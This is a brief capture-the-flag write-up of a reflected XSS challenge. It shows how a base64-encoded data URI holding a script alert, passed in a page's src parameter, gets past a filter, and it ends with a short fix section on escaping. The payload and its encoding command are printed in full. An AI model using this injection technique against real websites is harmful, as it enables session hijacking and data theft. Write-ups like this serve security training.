# XSS Reflected Media

## Exploit
On the homepage we can see a link to `${URL}/index.php?page=media&src=nsa`. The website tells us wrong answer if we just try to insert xss code in the URL.
Instead we'll try passing a [data URI scheme](https://en.wikipedia.org/wiki/Data_URI_scheme) in src, we'll use base64 as this is in the URL
```shell
$  echo -n "<script>alert("H4X3D")</script>" | base64
PHNjcmlwdD5hbGVydChINFgzRCk8L3NjcmlwdD4=
```

`data:text/html;base64,PHNjcmlwdD5hbGVydChINFgzRCk8L3NjcmlwdD4K"
We can now see the flag

## Fix
XSS vulnerabilities allow full control over the website and the theft of any sensitive information in the user session. To prevent XSS bugs developers should use whatever escaping feature their framework provide.
